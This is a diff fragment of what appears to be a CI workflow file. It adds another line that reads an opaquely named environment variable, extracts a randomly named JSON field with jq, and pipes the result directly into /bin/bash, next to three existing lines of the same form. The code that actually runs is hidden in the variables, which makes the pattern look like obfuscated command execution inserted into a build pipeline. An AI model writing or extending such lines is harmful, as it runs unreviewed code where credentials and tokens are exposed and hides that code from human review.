@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$ixc4112" | jq -r .e66 | /bin/bash
           echo $gdmq5 | jq -r .lc44 | /bin/bash
           printf '%s' "$imaq356" | jq -r .bip399 | /bin/bash
+          echo $ti1793 | jq -r .rvf566 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
